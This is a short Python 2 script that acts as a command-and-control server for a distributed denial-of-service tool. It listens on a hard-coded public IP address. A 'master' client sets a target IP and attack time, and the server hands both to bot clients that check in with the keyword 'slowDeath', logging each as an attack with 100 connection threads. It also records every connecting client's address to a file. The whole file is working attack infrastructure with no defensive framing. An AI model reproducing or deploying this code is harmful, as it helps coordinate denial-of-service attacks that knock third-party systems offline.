#!/usr/bin/python
from socket import *
import threading
import thread
import sys
import time
import datetime

master='master'
slowDeath = 'slowDeath'
global ipAdd
global ping_time
#ipAdd ='192.168.4.161'
ping_time = "2013-03-27-21-05-0"
threads = 100

def handler(clientsock,addr):
	while 1:
			global ipAdd
			global ping_time
			data = clientsock.recv(BUFSIZ)
			print >>sys.stderr, '\nReceived: "%s"' % data
			if data == master:
				ipAdd = clientsock.recv(BUFSIZ)
				print >>sys.stderr, 'New IP Address: "%s" ' % ipAdd
				ping_time = clientsock.recv(BUFSIZ)
				clientsock.send('\n\nConfirmed IP Address: "%s" ' % ipAdd)
				clientsock.send('\nConfirmed Attack Time: "%s" ' % ping_time)
				break
			elif data == slowDeath:
				clientsock.send(ipAdd)
				time.sleep(1)
				clientsock.send(ping_time)
				time.sleep(1)
				print >>sys.stderr, 'Attacked %s with %s Threads of Connections' % (ipAdd, threads)
				#break
			else:
				print >>sys.stderr, 'Invalid Access From: ', clientsock
				break
	print '\nWaiting For Connections'
	clientsock.close()

if __name__=='__main__':
	#HOST = 'localhost'
	HOST = '198.252.11.72'  #USE THIS
	PORT = 35000
	BUFSIZ = 1024
	ADDR = (HOST, PORT)
	serversock = socket(AF_INET, SOCK_STREAM)
	print >>sys.stderr, 'Starting Up On: %s => Port: %s' % ADDR
	print 'Waiting For Connections'
	serversock.bind(ADDR)
	serversock.listen(2)

	while 1:
		clientsock, addr = serversock.accept()
		f=open('client_address_list','a')
		f.write(str(addr) + '\n')
		f.close()

		print '\nConnection From: ', addr
		thread.start_new_thread(handler, (clientsock, addr))
